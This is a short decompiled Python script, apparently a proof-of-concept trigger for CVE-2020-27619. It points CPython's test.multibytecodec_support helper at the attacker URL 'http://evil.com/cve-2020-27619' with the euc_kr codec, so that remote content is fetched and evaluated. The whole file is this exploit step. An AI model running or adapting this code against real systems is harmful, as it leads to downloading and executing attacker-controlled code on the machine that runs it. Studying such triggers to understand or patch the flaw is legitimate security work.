# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 60_2.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 555 bytes
import test.multibytecodec_support as mbc_support
url = "http://evil.com/cve-2020-27619"
mbc_support.test_decode_refex("euc_kr", url)

# okay decompiling 60_2.pyc
